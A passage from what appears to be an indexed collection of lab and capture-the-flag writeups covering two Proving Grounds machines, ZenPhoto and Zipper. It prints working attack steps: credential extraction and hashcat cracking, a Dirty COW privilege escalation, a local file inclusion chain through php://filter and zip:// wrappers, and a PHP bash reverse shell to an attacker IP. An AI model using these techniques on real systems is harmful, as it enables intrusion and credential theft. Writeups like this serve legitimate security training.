<pre><code>python -c 'import pty; pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\nstty raw -echo; fg\n</code></pre></p> <p>I began enumerating the system for potential privilege escalation vectors: <pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre></p>"},{"location":"pg/zenphoto/#database-enumeration","title":"Database Enumeration","text":"<p>I found database credentials in the ZenPhoto configuration file: <pre><code>cat /var/www/zenphoto/zp-core/zp-config.php\n</code></pre></p> <p>This revealed the following credentials: - Database: zenphoto - Username: zenphoto - Password: zenph0t0</p> <p>I connected to the MySQL server to extract further information: <pre><code>mysql -u zenphoto -p'zenph0t0' -D zenphoto\n</code></pre></p> <p>I extracted user credentials from the administrators table: <pre><code>SELECT * FROM administrators;\n</code></pre></p> <p>This revealed an admin user with a hashed password, which I cracked using hashcat: <pre><code>hashcat -m 300 --force hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre></p>"},{"location":"pg/zenphoto/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"pg/zenphoto/#kernel-exploitation","title":"Kernel Exploitation","text":"<p>System enumeration revealed outdated kernel information: <pre><code>uname -a\nLinux ubuntu 2.6.32-21-generic #32-Ubuntu SMP i686 GNU/Linux\n</code></pre></p> <p>This kernel version (2.6.32) is vulnerable to multiple local privilege escalation vulnerabilities, including Dirty COW (CVE-2016-5195).</p> <p>I downloaded and compiled the Dirty COW exploit: <pre><code>gcc -pthread dirty.c -o dirty -lcrypt\n</code></pre></p> <p>Executed the exploit with a custom password: <pre><code>./dirty password123\n</code></pre></p> <p>The exploit created a new root user in /etc/passwd with the specified password.</p> <p>I switched to the newly created root user: <pre><code>su firefart\n</code></pre></p> <p>This provided a root shell, successfully completing the challenge.</p> <pre><code>uid=0(root) gid=0(root) groups=0(root)\n</code></pre>"},{"location":"pg/zipper/","title":"Zipper - Writeup","text":""},{"location":"pg/zipper/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"pg/zipper/#port-scanning","title":"Port Scanning","text":"<p>A comprehensive port scan revealed several open services: <pre><code>PORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH (Unknown version)\n25/tcp  open  smtp     Postfix SMTP service\n80/tcp  open  http     Apache httpd\n443/tcp open  https    Apache httpd (SSL/TLS)\n</code></pre></p>"},{"location":"pg/zipper/#system-information","title":"System Information","text":"<p>Target information gathered from post-exploitation: <pre><code>Linux zipper 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\n</code></pre></p>"},{"location":"pg/zipper/#web-enumeration","title":"Web Enumeration","text":"<p>The website appeared to be a custom ZIP archiving utility that allowed users to upload multiple files and compress them into a ZIP archive. Directory scanning with feroxbuster and wfuzz revealed standard web directories.</p>"},{"location":"pg/zipper/#gaining-initial-access","title":"Gaining Initial Access","text":""},{"location":"pg/zipper/#lfi-discovery","title":"LFI Discovery","text":"<p>During web enumeration, I discovered a potential Local File Inclusion (LFI) vulnerability in the application: <pre><code>http://192.168.162.229/index.php?file=\n</code></pre></p> <p>Testing the parameter revealed several important characteristics: - Regular LFI attempts did not return any content - Including \"index\" caused a 500 error, indicating an include operation was occurring - The URL <code>http://192.168.162.229/index.php?file=home</code> returned the home.php page - This suggested that the <code>.php</code> extension was being automatically appended to the file parameter</p>"},{"location":"pg/zipper/#source-code-analysis","title":"Source Code Analysis","text":"<p>Using PHP filter techniques, I was able to extract the source code of key application files: <pre><code>http://192.168.162.229/index.php?file=php://filter/convert.base64-encode/resource=upload\n</code></pre></p> <p>After decoding the base64 output, I discovered interesting functionality in <code>upload.php</code>:</p> <pre><code>&lt;?php\nif ($_FILES &amp;&amp; $_FILES['img']) {\n\n    if (!empty($_FILES['img']['name'][0])) {\n\n        $zip = new ZipArchive();\n        $zip_name = getcwd() . \"/uploads/upload_\" . time() . \".zip\";\n\n        // Create a zip target\n        if ($zip-&gt;open($zip_name, ZipArchive::CREATE) !== TRUE) {\n            $error .= \"Sorry ZIP creation is not working currently.&lt;br/&gt;\";\n        }\n\n        $imageCount = count($_FILES['img']['name']);\n        for($i=0;$i&lt;$imageCount;$i++) {\n\n            if ($_FILES['img']['tmp_name'][$i] == '') {\n                continue;\n            }\n            $newname = date('YmdHis', time()) . mt_rand() . '.tmp';\n\n            // Moving files to zip.\n            $zip-&gt;addFromString($_FILES['img']['name'][$i], file_get_contents($_FILES['img']['tmp_name'][$i]));\n\n            // moving files to the target folder.\n            move_uploaded_file($_FILES['img']['tmp_name'][$i], './uploads/' . $newname);\n        }\n        $zip-&gt;close();\n\n        // Create HTML Link option to download zip\n        $success = basename($zip_name);\n    } else {\n        $error = '&lt;strong&gt;Error!! &lt;/strong&gt; Please select a file.';\n    }\n}\n</code></pre> <p>Key observations from the code: 1. No file extension validation was being performed 2. Files were being uploaded to the <code>/uploads</code> directory 3. Each upload was also being compressed into a timestamped ZIP file</p>"},{"location":"pg/zipper/#php-reverse-shell-upload","title":"PHP Reverse Shell Upload","text":"<p>Since there were no restrictions on file extensions, I created a PHP reverse shell (<code>shell.php</code>) with the following content: <pre><code>&lt;?php\nexec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.45.157/4444 0&gt;&amp;1'\");\n?&gt;\n</code></pre></p> <p>I uploaded this file through the web interface which: 1. Stored the PHP file in the <code>/uploads</code> directory 2. Added the file to a ZIP archive (e.g., <code>upload_1733933598.zip</code>)</p>"},{"location":"pg/zipper/#shell-execution-via-zip-wrapper","title":"Shell Execution via ZIP Wrapper","text":"<p>To execute the PHP code, I leveraged PHP's ZIP wrapper functionality along with the LFI vulnerability: <pre><code>http://192.168.162.229/index.php?file=zip:///var/www/html/uploads/upload_1733933598.zip%23shell\n</code></pre></p> <p>The URL breaks down as follows: - <code>zip://</code> - PHP's ZIP wrapper protocol - <code>/var/www/html/uploads/upload_1733933598.zip</code> - Path to the uploaded ZIP file - <code>%23shell</code> - URL-encoded <code>#</code> followed by the filename inside the ZIP (without extension)</p> <p>With a netcat listener ready on port 4444, this request executed my reverse shell and provided initial access as the <code>www-data</code> user.</p>"},{"location":"pg/zipper/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"pg/zipper/#lateral-movement-to-marcot","title":"Lateral Movement to marcot","text":"<p>After gaining initial access as <code>www-data</code>, I ran enumeration scripts including linpeas and linenum to identify potential privilege escalation vectors.</p> <p>I discovered a git repository with SSH keys belonging to user <code>marcot</code>. Although the SSH key didn't work directly with any of the users, I was able to leverage information found in the repository to gain access as <code>marcot</code> through password spraying.</p>"},{"location":"pg/zipper/#lateral-movement-to-matthewa","title":"Lateral Movement to matthewa","text":"<p>From the <code>marcot</code> user, I continued enumeration and discovered credentials that allowed me to switch to the <code>matthewa</code> user.</p>"},{"location":"pg/zipper/#root-access","title":"Root Access","text":"<p>Using the process monitoring tool <code>pspy</code>, I observed a process revealing what appeared to be the root password. With this password, I was able to gain root access with <code>su root</code> and successfully complete the challenge.</p>"},{"location":"web/","title":"CTF Writeups Overview","text":"Loading writeups..."}]}